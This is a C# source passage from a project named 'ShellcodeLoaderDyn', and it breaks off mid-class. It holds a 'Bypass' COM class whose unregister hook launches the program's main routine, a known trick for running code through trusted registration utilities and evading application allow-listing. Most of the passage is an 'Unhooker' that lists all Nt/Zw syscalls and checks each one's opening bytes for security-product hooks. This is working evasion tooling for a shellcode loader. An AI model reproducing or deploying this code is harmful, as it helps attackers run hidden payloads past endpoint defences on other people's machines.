using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using DI = XYZ.DI;
using System.EnterpriseServices;

namespace ShellcodeLoaderDyn
{
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            Console.WriteLine("DLL Started, calling Main");
            Program.Main();
        }
    }
    public class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr Sleep(uint dwMilliseconds);
    }
    partial class Unhooker
    {
        static string[] functions =
        {
            "NtAcceptConnectPort",
            "NtAccessCheck",
            "NtAccessCheckAndAuditAlarm",
            "NtAccessCheckByType",
            "NtAccessCheckByTypeAndAuditAlarm",
            "NtAccessCheckByTypeResultList",
            "NtAccessCheckByTypeResultListAndAuditAlarm",
            "NtAccessCheckByTypeResultListAndAuditAlarmByHandle",
            "NtAddAtom",
            "NtAddAtomEx",
            "NtAddBootEntry",
            "NtAddDriverEntry",
            "NtAdjustGroupsToken",
            "NtAdjustPrivilegesToken",
            "NtAdjustTokenClaimsAndDeviceGroups",
            "NtAlertResumeThread",
            "NtAlertThread",
            "NtAlertThreadByThreadId",
            "NtAllocateLocallyUniqueId",
            "NtAllocateReserveObject",
            "NtAllocateUserPhysicalPages",
            "NtAllocateUuids",
            "NtAllocateVirtualMemory",
            "NtAlpcAcceptConnectPort",
            "NtAlpcCancelMessage",
            "NtAlpcConnectPort",
            "NtAlpcConnectPortEx",
            "NtAlpcCreatePort",
            "NtAlpcCreatePortSection",
            "NtAlpcCreateResourceReserve",
            "NtAlpcCreateSectionView",
            "NtAlpcCreateSecurityContext",
            "NtAlpcDeletePortSection",
            "NtAlpcDeleteResourceReserve",
            "NtAlpcDeleteSectionView",
            "NtAlpcDeleteSecurityContext",
            "NtAlpcDisconnectPort",
            "NtAlpcImpersonateClientContainerOfPort",
            "NtAlpcImpersonateClientOfPort",
            "NtAlpcOpenSenderProcess",
            "NtAlpcOpenSenderThread",
            "NtAlpcQueryInformation",
            "NtAlpcQueryInformationMessage",
            "NtAlpcRevokeSecurityContext",
            "NtAlpcSendWaitReceivePort",
            "NtAlpcSetInformation",
            "NtApphelpCacheControl",
            "NtAreMappedFilesTheSame",
            "NtAssignProcessToJobObject",
            "NtAssociateWaitCompletionPacket",
            "NtCallbackReturn",
            "NtCancelIoFile",
            "NtCancelIoFileEx",
            "NtCancelSynchronousIoFile",
            "NtCancelTimer",
            "NtCancelTimer2",
            "NtCancelWaitCompletionPacket",
            "NtClearEvent",
            "NtClose",
            "NtCloseObjectAuditAlarm",
            "NtCommitComplete",
            "NtCommitEnlistment",
            "NtCommitRegistryTransaction",
            "NtCommitTransaction",
            "NtCompactKeys",
            "NtCompareObjects",
            "NtCompareTokens",
            "NtCompleteConnectPort",
            "NtCompressKey",
            "NtConnectPort",
            "NtContinue",
            "NtCreateDebugObject",
            "NtCreateDirectoryObject",
            "NtCreateDirectoryObjectEx",
            "NtCreateEnclave",
            "NtCreateEnlistment",
            "NtCreateEvent",
            "NtCreateEventPair",
            "NtCreateFile",
            "NtCreateIRTimer",
            "NtCreateIoCompletion",
            "NtCreateJobObject",
            "NtCreateJobSet",
            "NtCreateKey",
            "NtCreateKeyTransacted",
            "NtCreateKeyedEvent",
            "NtCreateLowBoxToken",
            "NtCreateMailslotFile",
            "NtCreateMutant",
            "NtCreateNamedPipeFile",
            "NtCreatePagingFile",
            "NtCreatePartition",
            "NtCreatePort",
            "NtCreatePrivateNamespace",
            "NtCreateProcess",
            "NtCreateProcessEx",
            "NtCreateProfile",
            "NtCreateProfileEx",
            "NtCreateRegistryTransaction",
            "NtCreateResourceManager",
            "NtCreateSection",
            "NtCreateSemaphore",
            "NtCreateSymbolicLinkObject",
            "NtCreateThread",
            "NtCreateThreadEx",
            "NtCreateTimer",
            "NtCreateTimer2",
            "NtCreateToken",
            "NtCreateTokenEx",
            "NtCreateTransaction",
            "NtCreateTransactionManager",
            "NtCreateUserProcess",
            "NtCreateWaitCompletionPacket",
            "NtCreateWaitablePort",
            "NtCreateWnfStateName",
            "NtCreateWorkerFactory",
            "NtDebugActiveProcess",
            "NtDebugContinue",
            "NtDelayExecution",
            "NtDeleteAtom",
            "NtDeleteBootEntry",
            "NtDeleteDriverEntry",
            "NtDeleteFile",
            "NtDeleteKey",
            "NtDeleteObjectAuditAlarm",
            "NtDeletePrivateNamespace",
            "NtDeleteValueKey",
            "NtDeleteWnfStateData",
            "NtDeleteWnfStateName",
            "NtDeviceIoControlFile",
            "NtDisableLastKnownGood",
            "NtDisplayString",
            "NtDrawText",
            "NtDuplicateObject",
            "NtDuplicateToken",
            "NtEnableLastKnownGood",
            "NtEnumerateBootEntries",
            "NtEnumerateDriverEntries",
            "NtEnumerateKey",
            "NtEnumerateSystemEnvironmentValuesEx",
            "NtEnumerateTransactionObject",
            "NtEnumerateValueKey",
            "NtExtendSection",
            "NtFilterBootOption",
            "NtFilterToken",
            "NtFilterTokenEx",
            "NtFindAtom",
            "NtFlushBuffersFile",
            "NtFlushBuffersFileEx",
            "NtFlushInstallUILanguage",
            "NtFlushInstructionCache",
            "NtFlushKey",
            "NtFlushProcessWriteBuffers",
            "NtFlushVirtualMemory",
            "NtFlushWriteBuffer",
            "NtFreeUserPhysicalPages",
            "NtFreeVirtualMemory",
            "NtFreezeRegistry",
            "NtFreezeTransactions",
            "NtFsControlFile",
            "NtGetCachedSigningLevel",
            "NtGetCompleteWnfStateSubscription",
            "NtGetContextThread",
            "NtGetCurrentProcessorNumber",
            "NtGetCurrentProcessorNumberEx",
            "NtGetDevicePowerState",
            "NtGetMUIRegistryInfo",
            "NtGetNextProcess",
            "NtGetNextThread",
            "NtGetNlsSectionPtr",
            "NtGetNotificationResourceManager",
            "NtGetTickCount",
            "NtGetWriteWatch",
            "NtImpersonateAnonymousToken",
            "NtImpersonateClientOfPort",
            "NtImpersonateThread",
            "NtInitializeEnclave",
            "NtInitializeNlsFiles",
            "NtInitializeRegistry",
            "NtInitiatePowerAction",
            "NtIsProcessInJob",
            "NtIsSystemResumeAutomatic",
            "NtIsUILanguageComitted",
            "NtListenPort",
            "NtLoadDriver",
            "NtLoadEnclaveData",
            "NtLoadKey",
            "NtLoadKey2",
            "NtLoadKey3",
            "NtLoadKeyEx",
            "NtLockFile",
            "NtLockProductActivationKeys",
            "NtLockRegistryKey",
            "NtLockVirtualMemory",
            "NtMakePermanentObject",
            "NtMakeTemporaryObject",
            "NtManagePartition",
            "NtMapCMFModule",
            "NtMapUserPhysicalPages",
            "NtMapUserPhysicalPagesScatter",
            "NtMapViewOfSection",
            "NtModifyBootEntry",
            "NtModifyDriverEntry",
            "NtNotifyChangeDirectoryFile",
            "NtNotifyChangeKey",
            "NtNotifyChangeMultipleKeys",
            "NtNotifyChangeSession",
            "NtOpenDirectoryObject",
            "NtOpenEnlistment",
            "NtOpenEvent",
            "NtOpenEventPair",
            "NtOpenFile",
            "NtOpenIoCompletion",
            "NtOpenJobObject",
            "NtOpenKey",
            "NtOpenKeyEx",
            "NtOpenKeyTransacted",
            "NtOpenKeyTransactedEx",
            "NtOpenKeyedEvent",
            "NtOpenMutant",
            "NtOpenObjectAuditAlarm",
            "NtOpenPartition",
            "NtOpenPrivateNamespace",
            "NtOpenProcess",
            "NtOpenProcessToken",
            "NtOpenProcessTokenEx",
            "NtOpenRegistryTransaction",
            "NtOpenResourceManager",
            "NtOpenSection",
            "NtOpenSemaphore",
            "NtOpenSession",
            "NtOpenSymbolicLinkObject",
            "NtOpenThread",
            "NtOpenThreadToken",
            "NtOpenThreadTokenEx",
            "NtOpenTimer",
            "NtOpenTransaction",
            "NtOpenTransactionManager",
            "NtPlugPlayControl",
            "NtPowerInformation",
            "NtPrePrepareComplete",
            "NtPrePrepareEnlistment",
            "NtPrepareComplete",
            "NtPrepareEnlistment",
            "NtPrivilegeCheck",
            "NtPrivilegeObjectAuditAlarm",
            "NtPrivilegedServiceAuditAlarm",
            "NtPropagationComplete",
            "NtPropagationFailed",
            "NtProtectVirtualMemory",
            "NtPulseEvent",
            "NtQueryAttributesFile",
            "NtQueryBootEntryOrder",
            "NtQueryBootOptions",
            "NtQueryDebugFilterState",
            "NtQueryDefaultLocale",
            "NtQueryDefaultUILanguage",
            "NtQueryDirectoryFile",
            "NtQueryDirectoryObject",
            "NtQueryDriverEntryOrder",
            "NtQueryEaFile",
            "NtQueryEvent",
            "NtQueryFullAttributesFile",
            "NtQueryInformationAtom",
            "NtQueryInformationEnlistment",
            "NtQueryInformationFile",
            "NtQueryInformationJobObject",
            "NtQueryInformationPort",
            "NtQueryInformationProcess",
            "NtQueryInformationResourceManager",
            "NtQueryInformationThread",
            "NtQueryInformationToken",
            "NtQueryInformationTransaction",
            "NtQueryInformationTransactionManager",
            "NtQueryInformationWorkerFactory",
            "NtQueryInstallUILanguage",
            "NtQueryIntervalProfile",
            "NtQueryIoCompletion",
            "NtQueryKey",
            "NtQueryLicenseValue",
            "NtQueryMultipleValueKey",
            "NtQueryMutant",
            "NtQueryObject",
            "NtQueryOpenSubKeys",
            "NtQueryOpenSubKeysEx",
            "NtQueryPerformanceCounter",
            "NtQueryPortInformationProcess",
            "NtQueryQuotaInformationFile",
            "NtQuerySection",
            "NtQuerySecurityAttributesToken",
            "NtQuerySecurityObject",
            "NtQuerySecurityPolicy",
            "NtQuerySemaphore",
            "NtQuerySymbolicLinkObject",
            "NtQuerySystemEnvironmentValue",
            "NtQuerySystemEnvironmentValueEx",
            "NtQuerySystemInformation",
            "NtQuerySystemInformationEx",
            "NtQuerySystemTime",
            "NtQueryTimer",
            "NtQueryTimerResolution",
            "NtQueryValueKey",
            "NtQueryVirtualMemory",
            "NtQueryVolumeInformationFile",
            "NtQueryWnfStateData",
            "NtQueryWnfStateNameInformation",
            "NtQueueApcThread",
            "NtQueueApcThreadEx",
            "NtRaiseException",
            "NtRaiseHardError",
            "NtReadFile",
            "NtReadFileScatter",
            "NtReadOnlyEnlistment",
            "NtReadRequestData",
            "NtReadVirtualMemory",
            "NtRecoverEnlistment",
            "NtRecoverResourceManager",
            "NtRecoverTransactionManager",
            "NtRegisterProtocolAddressInformation",
            "NtRegisterThreadTerminatePort",
            "NtReleaseKeyedEvent",
            "NtReleaseMutant",
            "NtReleaseSemaphore",
            "NtReleaseWorkerFactoryWorker",
            "NtRemoveIoCompletion",
            "NtRemoveIoCompletionEx",
            "NtRemoveProcessDebug",
            "NtRenameKey",
            "NtRenameTransactionManager",
            "NtReplaceKey",
            "NtReplacePartitionUnit",
            "NtReplyPort",
            "NtReplyWaitReceivePort",
            "NtReplyWaitReceivePortEx",
            "NtReplyWaitReplyPort",
            "NtRequestPort",
            "NtRequestWaitReplyPort",
            "NtResetEvent",
            "NtResetWriteWatch",
            "NtRestoreKey",
            "NtResumeProcess",
            "NtResumeThread",
            "NtRevertContainerImpersonation",
            "NtRollbackComplete",
            "NtRollbackEnlistment",
            "NtRollbackRegistryTransaction",
            "NtRollbackTransaction",
            "NtRollforwardTransactionManager",
            "NtSaveKey",
            "NtSaveKeyEx",
            "NtSaveMergedKeys",
            "NtSecureConnectPort",
            "NtSerializeBoot",
            "NtSetBootEntryOrder",
            "NtSetBootOptions",
            "NtSetCachedSigningLevel",
            "NtSetCachedSigningLevel2",
            "NtSetContextThread",
            "NtSetDebugFilterState",
            "NtSetDefaultHardErrorPort",
            "NtSetDefaultLocale",
            "NtSetDefaultUILanguage",
            "NtSetDriverEntryOrder",
            "NtSetEaFile",
            "NtSetEvent",
            "NtSetEventBoostPriority",
            "NtSetHighEventPair",
            "NtSetHighWaitLowEventPair",
            "NtSetIRTimer",
            "NtSetInformationDebugObject",
            "NtSetInformationEnlistment",
            "NtSetInformationFile",
            "NtSetInformationJobObject",
            "NtSetInformationKey",
            "NtSetInformationObject",
            "NtSetInformationProcess",
            "NtSetInformationResourceManager",
            "NtSetInformationSymbolicLink",
            "NtSetInformationThread",
            "NtSetInformationToken",
            "NtSetInformationTransaction",
            "NtSetInformationTransactionManager",
            "NtSetInformationVirtualMemory",
            "NtSetInformationWorkerFactory",
            "NtSetIntervalProfile",
            "NtSetIoCompletion",
            "NtSetIoCompletionEx",
            "NtSetLdtEntries",
            "NtSetLowEventPair",
            "NtSetLowWaitHighEventPair",
            "NtSetQuotaInformationFile",
            "NtSetSecurityObject",
            "NtSetSystemEnvironmentValue",
            "NtSetSystemEnvironmentValueEx",
            "NtSetSystemInformation",
            "NtSetSystemPowerState",
            "NtSetSystemTime",
            "NtSetThreadExecutionState",
            "NtSetTimer",
            "NtSetTimer2",
            "NtSetTimerEx",
            "NtSetTimerResolution",
            "NtSetUuidSeed",
            "NtSetValueKey",
            "NtSetVolumeInformationFile",
            "NtSetWnfProcessNotificationEvent",
            "NtShutdownSystem",
            "NtShutdownWorkerFactory",
            "NtSignalAndWaitForSingleObject",
            "NtSinglePhaseReject",
            "NtStartProfile",
            "NtStopProfile",
            "NtSubscribeWnfStateChange",
            "NtSuspendProcess",
            "NtSuspendThread",
            "NtSystemDebugControl",
            "NtTerminateJobObject",
            "NtTerminateProcess",
            "NtTerminateThread",
            "NtTestAlert",
            "NtThawRegistry",
            "NtThawTransactions",
            "NtTraceControl",
            "NtTraceEvent",
            "NtTranslateFilePath",
            "NtUmsThreadYield",
            "NtUnloadDriver",
            "NtUnloadKey",
            "NtUnloadKey2",
            "NtUnloadKeyEx",
            "NtUnlockFile",
            "NtUnlockVirtualMemory",
            "NtUnmapViewOfSection",
            "NtUnmapViewOfSectionEx",
            "NtUnsubscribeWnfStateChange",
            "NtUpdateWnfStateData",
            "NtVdmControl",
            "NtWaitForAlertByThreadId",
            "NtWaitForDebugEvent",
            "NtWaitForKeyedEvent",
            "NtWaitForMultipleObjects",
            "NtWaitForMultipleObjects32",
            "NtWaitForSingleObject",
            "NtWaitForWorkViaWorkerFactory",
            "NtWaitHighEventPair",
            "NtWaitLowEventPair",
            "NtWorkerFactoryWorkerReady",
            "NtWriteFile",
            "NtWriteFileGather",
            "NtWriteRequestData",
            "NtWriteVirtualMemory",
            "NtYieldExecution",
            "NtdllDefWindowProc_A",
            "NtdllDefWindowProc_W",
            "NtdllDialogWndProc_A",
            "NtdllDialogWndProc_W",
            "ZwAcceptConnectPort",
            "ZwAccessCheck",
            "ZwAccessCheckAndAuditAlarm",
            "ZwAccessCheckByType",
            "ZwAccessCheckByTypeAndAuditAlarm",
            "ZwAccessCheckByTypeResultList",
            "ZwAccessCheckByTypeResultListAndAuditAlarm",
            "ZwAccessCheckByTypeResultListAndAuditAlarmByHandle",
            "ZwAddAtom",
            "ZwAddAtomEx",
            "ZwAddBootEntry",
            "ZwAddDriverEntry",
            "ZwAdjustGroupsToken",
            "ZwAdjustPrivilegesToken",
            "ZwAdjustTokenClaimsAndDeviceGroups",
            "ZwAlertResumeThread",
            "ZwAlertThread",
            "ZwAlertThreadByThreadId",
            "ZwAllocateLocallyUniqueId",
            "ZwAllocateReserveObject",
            "ZwAllocateUserPhysicalPages",
            "ZwAllocateUuids",
            "ZwAllocateVirtualMemory",
            "ZwAlpcAcceptConnectPort",
            "ZwAlpcCancelMessage",
            "ZwAlpcConnectPort",
            "ZwAlpcConnectPortEx",
            "ZwAlpcCreatePort",
            "ZwAlpcCreatePortSection",
            "ZwAlpcCreateResourceReserve",
            "ZwAlpcCreateSectionView",
            "ZwAlpcCreateSecurityContext",
            "ZwAlpcDeletePortSection",
            "ZwAlpcDeleteResourceReserve",
            "ZwAlpcDeleteSectionView",
            "ZwAlpcDeleteSecurityContext",
            "ZwAlpcDisconnectPort",
            "ZwAlpcImpersonateClientContainerOfPort",
            "ZwAlpcImpersonateClientOfPort",
            "ZwAlpcOpenSenderProcess",
            "ZwAlpcOpenSenderThread",
            "ZwAlpcQueryInformation",
            "ZwAlpcQueryInformationMessage",
            "ZwAlpcRevokeSecurityContext",
            "ZwAlpcSendWaitReceivePort",
            "ZwAlpcSetInformation",
            "ZwApphelpCacheControl",
            "ZwAreMappedFilesTheSame",
            "ZwAssignProcessToJobObject",
            "ZwAssociateWaitCompletionPacket",
            "ZwCallbackReturn",
            "ZwCancelIoFile",
            "ZwCancelIoFileEx",
            "ZwCancelSynchronousIoFile",
            "ZwCancelTimer",
            "ZwCancelTimer2",
            "ZwCancelWaitCompletionPacket",
            "ZwClearEvent",
            "ZwClose",
            "ZwCloseObjectAuditAlarm",
            "ZwCommitComplete",
            "ZwCommitEnlistment",
            "ZwCommitRegistryTransaction",
            "ZwCommitTransaction",
            "ZwCompactKeys",
            "ZwCompareObjects",
            "ZwCompareTokens",
            "ZwCompleteConnectPort",
            "ZwCompressKey",
            "ZwConnectPort",
            "ZwContinue",
            "ZwCreateDebugObject",
            "ZwCreateDirectoryObject",
            "ZwCreateDirectoryObjectEx",
            "ZwCreateEnclave",
            "ZwCreateEnlistment",
            "ZwCreateEvent",
            "ZwCreateEventPair",
            "ZwCreateFile",
            "ZwCreateIRTimer",
            "ZwCreateIoCompletion",
            "ZwCreateJobObject",
            "ZwCreateJobSet",
            "ZwCreateKey",
            "ZwCreateKeyTransacted",
            "ZwCreateKeyedEvent",
            "ZwCreateLowBoxToken",
            "ZwCreateMailslotFile",
            "ZwCreateMutant",
            "ZwCreateNamedPipeFile",
            "ZwCreatePagingFile",
            "ZwCreatePartition",
            "ZwCreatePort",
            "ZwCreatePrivateNamespace",
            "ZwCreateProcess",
            "ZwCreateProcessEx",
            "ZwCreateProfile",
            "ZwCreateProfileEx",
            "ZwCreateRegistryTransaction",
            "ZwCreateResourceManager",
            "ZwCreateSection",
            "ZwCreateSemaphore",
            "ZwCreateSymbolicLinkObject",
            "ZwCreateThread",
            "ZwCreateThreadEx",
            "ZwCreateTimer",
            "ZwCreateTimer2",
            "ZwCreateToken",
            "ZwCreateTokenEx",
            "ZwCreateTransaction",
            "ZwCreateTransactionManager",
            "ZwCreateUserProcess",
            "ZwCreateWaitCompletionPacket",
            "ZwCreateWaitablePort",
            "ZwCreateWnfStateName",
            "ZwCreateWorkerFactory",
            "ZwDebugActiveProcess",
            "ZwDebugContinue",
            "ZwDelayExecution",
            "ZwDeleteAtom",
            "ZwDeleteBootEntry",
            "ZwDeleteDriverEntry",
            "ZwDeleteFile",
            "ZwDeleteKey",
            "ZwDeleteObjectAuditAlarm",
            "ZwDeletePrivateNamespace",
            "ZwDeleteValueKey",
            "ZwDeleteWnfStateData",
            "ZwDeleteWnfStateName",
            "ZwDeviceIoControlFile",
            "ZwDisableLastKnownGood",
            "ZwDisplayString",
            "ZwDrawText",
            "ZwDuplicateObject",
            "ZwDuplicateToken",
            "ZwEnableLastKnownGood",
            "ZwEnumerateBootEntries",
            "ZwEnumerateDriverEntries",
            "ZwEnumerateKey",
            "ZwEnumerateSystemEnvironmentValuesEx",
            "ZwEnumerateTransactionObject",
            "ZwEnumerateValueKey",
            "ZwExtendSection",
            "ZwFilterBootOption",
            "ZwFilterToken",
            "ZwFilterTokenEx",
            "ZwFindAtom",
            "ZwFlushBuffersFile",
            "ZwFlushBuffersFileEx",
            "ZwFlushInstallUILanguage",
            "ZwFlushInstructionCache",
            "ZwFlushKey",
            "ZwFlushProcessWriteBuffers",
            "ZwFlushVirtualMemory",
            "ZwFlushWriteBuffer",
            "ZwFreeUserPhysicalPages",
            "ZwFreeVirtualMemory",
            "ZwFreezeRegistry",
            "ZwFreezeTransactions",
            "ZwFsControlFile",
            "ZwGetCachedSigningLevel",
            "ZwGetCompleteWnfStateSubscription",
            "ZwGetContextThread",
            "ZwGetCurrentProcessorNumber",
            "ZwGetCurrentProcessorNumberEx",
            "ZwGetDevicePowerState",
            "ZwGetMUIRegistryInfo",
            "ZwGetNextProcess",
            "ZwGetNextThread",
            "ZwGetNlsSectionPtr",
            "ZwGetNotificationResourceManager",
            "ZwGetWriteWatch",
            "ZwImpersonateAnonymousToken",
            "ZwImpersonateClientOfPort",
            "ZwImpersonateThread",
            "ZwInitializeEnclave",
            "ZwInitializeNlsFiles",
            "ZwInitializeRegistry",
            "ZwInitiatePowerAction",
            "ZwIsProcessInJob",
            "ZwIsSystemResumeAutomatic",
            "ZwIsUILanguageComitted",
            "ZwListenPort",
            "ZwLoadDriver",
            "ZwLoadEnclaveData",
            "ZwLoadKey",
            "ZwLoadKey2",
            "ZwLoadKey3",
            "ZwLoadKeyEx",
            "ZwLockFile",
            "ZwLockProductActivationKeys",
            "ZwLockRegistryKey",
            "ZwLockVirtualMemory",
            "ZwMakePermanentObject",
            "ZwMakeTemporaryObject",
            "ZwManagePartition",
            "ZwMapCMFModule",
            "ZwMapUserPhysicalPages",
            "ZwMapUserPhysicalPagesScatter",
            "ZwMapViewOfSection",
            "ZwModifyBootEntry",
            "ZwModifyDriverEntry",
            "ZwNotifyChangeDirectoryFile",
            "ZwNotifyChangeKey",
            "ZwNotifyChangeMultipleKeys",
            "ZwNotifyChangeSession",
            "ZwOpenDirectoryObject",
            "ZwOpenEnlistment",
            "ZwOpenEvent",
            "ZwOpenEventPair",
            "ZwOpenFile",
            "ZwOpenIoCompletion",
            "ZwOpenJobObject",
            "ZwOpenKey",
            "ZwOpenKeyEx",
            "ZwOpenKeyTransacted",
            "ZwOpenKeyTransactedEx",
            "ZwOpenKeyedEvent",
            "ZwOpenMutant",
            "ZwOpenObjectAuditAlarm",
            "ZwOpenPartition",
            "ZwOpenPrivateNamespace",
            "ZwOpenProcess",
            "ZwOpenProcessToken",
            "ZwOpenProcessTokenEx",
            "ZwOpenRegistryTransaction",
            "ZwOpenResourceManager",
            "ZwOpenSection",
            "ZwOpenSemaphore",
            "ZwOpenSession",
            "ZwOpenSymbolicLinkObject",
            "ZwOpenThread",
            "ZwOpenThreadToken",
            "ZwOpenThreadTokenEx",
            "ZwOpenTimer",
            "ZwOpenTransaction",
            "ZwOpenTransactionManager",
            "ZwPlugPlayControl",
            "ZwPowerInformation",
            "ZwPrePrepareComplete",
            "ZwPrePrepareEnlistment",
            "ZwPrepareComplete",
            "ZwPrepareEnlistment",
            "ZwPrivilegeCheck",
            "ZwPrivilegeObjectAuditAlarm",
            "ZwPrivilegedServiceAuditAlarm",
            "ZwPropagationComplete",
            "ZwPropagationFailed",
            "ZwProtectVirtualMemory",
            "ZwPulseEvent",
            "ZwQueryAttributesFile",
            "ZwQueryBootEntryOrder",
            "ZwQueryBootOptions",
            "ZwQueryDebugFilterState",
            "ZwQueryDefaultLocale",
            "ZwQueryDefaultUILanguage",
            "ZwQueryDirectoryFile",
            "ZwQueryDirectoryObject",
            "ZwQueryDriverEntryOrder",
            "ZwQueryEaFile",
            "ZwQueryEvent",
            "ZwQueryFullAttributesFile",
            "ZwQueryInformationAtom",
            "ZwQueryInformationEnlistment",
            "ZwQueryInformationFile",
            "ZwQueryInformationJobObject",
            "ZwQueryInformationPort",
            "ZwQueryInformationProcess",
            "ZwQueryInformationResourceManager",
            "ZwQueryInformationThread",
            "ZwQueryInformationToken",
            "ZwQueryInformationTransaction",
            "ZwQueryInformationTransactionManager",
            "ZwQueryInformationWorkerFactory",
            "ZwQueryInstallUILanguage",
            "ZwQueryIntervalProfile",
            "ZwQueryIoCompletion",
            "ZwQueryKey",
            "ZwQueryLicenseValue",
            "ZwQueryMultipleValueKey",
            "ZwQueryMutant",
            "ZwQueryObject",
            "ZwQueryOpenSubKeys",
            "ZwQueryOpenSubKeysEx",
            "ZwQueryPerformanceCounter",
            "ZwQueryPortInformationProcess",
            "ZwQueryQuotaInformationFile",
            "ZwQuerySection",
            "ZwQuerySecurityAttributesToken",
            "ZwQuerySecurityObject",
            "ZwQuerySecurityPolicy",
            "ZwQuerySemaphore",
            "ZwQuerySymbolicLinkObject",
            "ZwQuerySystemEnvironmentValue",
            "ZwQuerySystemEnvironmentValueEx",
            "ZwQuerySystemInformation",
            "ZwQuerySystemInformationEx",
            "ZwQuerySystemTime",
            "ZwQueryTimer",
            "ZwQueryTimerResolution",
            "ZwQueryValueKey",
            "ZwQueryVirtualMemory",
            "ZwQueryVolumeInformationFile",
            "ZwQueryWnfStateData",
            "ZwQueryWnfStateNameInformation",
            "ZwQueueApcThread",
            "ZwQueueApcThreadEx",
            "ZwRaiseException",
            "ZwRaiseHardError",
            "ZwReadFile",
            "ZwReadFileScatter",
            "ZwReadOnlyEnlistment",
            "ZwReadRequestData",
            "ZwReadVirtualMemory",
            "ZwRecoverEnlistment",
            "ZwRecoverResourceManager",
            "ZwRecoverTransactionManager",
            "ZwRegisterProtocolAddressInformation",
            "ZwRegisterThreadTerminatePort",
            "ZwReleaseKeyedEvent",
            "ZwReleaseMutant",
            "ZwReleaseSemaphore",
            "ZwReleaseWorkerFactoryWorker",
            "ZwRemoveIoCompletion",
            "ZwRemoveIoCompletionEx",
            "ZwRemoveProcessDebug",
            "ZwRenameKey",
            "ZwRenameTransactionManager",
            "ZwReplaceKey",
            "ZwReplacePartitionUnit",
            "ZwReplyPort",
            "ZwReplyWaitReceivePort",
            "ZwReplyWaitReceivePortEx",
            "ZwReplyWaitReplyPort",
            "ZwRequestPort",
            "ZwRequestWaitReplyPort",
            "ZwResetEvent",
            "ZwResetWriteWatch",
            "ZwRestoreKey",
            "ZwResumeProcess",
            "ZwResumeThread",
            "ZwRevertContainerImpersonation",
            "ZwRollbackComplete",
            "ZwRollbackEnlistment",
            "ZwRollbackRegistryTransaction",
            "ZwRollbackTransaction",
            "ZwRollforwardTransactionManager",
            "ZwSaveKey",
            "ZwSaveKeyEx",
            "ZwSaveMergedKeys",
            "ZwSecureConnectPort",
            "ZwSerializeBoot",
            "ZwSetBootEntryOrder",
            "ZwSetBootOptions",
            "ZwSetCachedSigningLevel",
            "ZwSetCachedSigningLevel2",
            "ZwSetContextThread",
            "ZwSetDebugFilterState",
            "ZwSetDefaultHardErrorPort",
            "ZwSetDefaultLocale",
            "ZwSetDefaultUILanguage",
            "ZwSetDriverEntryOrder",
            "ZwSetEaFile",
            "ZwSetEvent",
            "ZwSetEventBoostPriority",
            "ZwSetHighEventPair",
            "ZwSetHighWaitLowEventPair",
            "ZwSetIRTimer",
            "ZwSetInformationDebugObject",
            "ZwSetInformationEnlistment",
            "ZwSetInformationFile",
            "ZwSetInformationJobObject",
            "ZwSetInformationKey",
            "ZwSetInformationObject",
            "ZwSetInformationProcess",
            "ZwSetInformationResourceManager",
            "ZwSetInformationSymbolicLink",
            "ZwSetInformationThread",
            "ZwSetInformationToken",
            "ZwSetInformationTransaction",
            "ZwSetInformationTransactionManager",
            "ZwSetInformationVirtualMemory",
            "ZwSetInformationWorkerFactory",
            "ZwSetIntervalProfile",
            "ZwSetIoCompletion",
            "ZwSetIoCompletionEx",
            "ZwSetLdtEntries",
            "ZwSetLowEventPair",
            "ZwSetLowWaitHighEventPair",
            "ZwSetQuotaInformationFile",
            "ZwSetSecurityObject",
            "ZwSetSystemEnvironmentValue",
            "ZwSetSystemEnvironmentValueEx",
            "ZwSetSystemInformation",
            "ZwSetSystemPowerState",
            "ZwSetSystemTime",
            "ZwSetThreadExecutionState",
            "ZwSetTimer",
            "ZwSetTimer2",
            "ZwSetTimerEx",
            "ZwSetTimerResolution",
            "ZwSetUuidSeed",
            "ZwSetValueKey",
            "ZwSetVolumeInformationFile",
            "ZwSetWnfProcessNotificationEvent",
            "ZwShutdownSystem",
            "ZwShutdownWorkerFactory",
            "ZwSignalAndWaitForSingleObject",
            "ZwSinglePhaseReject",
            "ZwStartProfile",
            "ZwStopProfile",
            "ZwSubscribeWnfStateChange",
            "ZwSuspendProcess",
            "ZwSuspendThread",
            "ZwSystemDebugControl",
            "ZwTerminateJobObject",
            "ZwTerminateProcess",
            "ZwTerminateThread",
            "ZwTestAlert",
            "ZwThawRegistry",
            "ZwThawTransactions",
            "ZwTraceControl",
            "ZwTraceEvent",
            "ZwTranslateFilePath",
            "ZwUmsThreadYield",
            "ZwUnloadDriver",
            "ZwUnloadKey",
            "ZwUnloadKey2",
            "ZwUnloadKeyEx",
            "ZwUnlockFile",
            "ZwUnlockVirtualMemory",
            "ZwUnmapViewOfSection",
            "ZwUnmapViewOfSectionEx",
            "ZwUnsubscribeWnfStateChange",
            "ZwUpdateWnfStateData",
            "ZwVdmControl",
            "ZwWaitForAlertByThreadId",
            "ZwWaitForDebugEvent",
            "ZwWaitForKeyedEvent",
            "ZwWaitForMultipleObjects",
            "ZwWaitForMultipleObjects32",
            "ZwWaitForSingleObject",
            "ZwWaitForWorkViaWorkerFactory",
            "ZwWaitHighEventPair",
            "ZwWaitLowEventPair",
            "ZwWorkerFactoryWorkerReady",
            "ZwWriteFile",
            "ZwWriteFileGather",
            "ZwWriteRequestData",
            "ZwWriteVirtualMemory",
            "ZwYieldExecution"
        };
        static byte[] safeBytes = {
            0x4c, 0x8b, 0xd1, // mov r10, rcx
            0xb8              // mov eax, ??
        };

        private static bool check_safe_func(KeyValuePair<string, IntPtr> func)
        {
            byte[] instructions = new byte[4];
            Marshal.Copy(func.Value, instructions, 0, 4);
            string fmtFunc = string.Format("    {0,-25} 0x{1:X} ", func.Key, func.Value.ToInt64());

            if (instructions.SequenceEqual(safeBytes))
            {
                Console.WriteLine(fmtFunc + "- SAFE");
                return true;
            }
            else
            {
                byte[] hookInstructions = new byte[32];
                Marshal.Copy(func.Value, hookInstructions, 0, 32);
                Console.WriteLine(fmtFunc + " - HOOK DETECTED");
                Console.WriteLine("    {0,-25} {1}", "Instructions: ", BitConverter.ToString(hookInstructions).Replace("-", " "));
                return false;
            }
        }

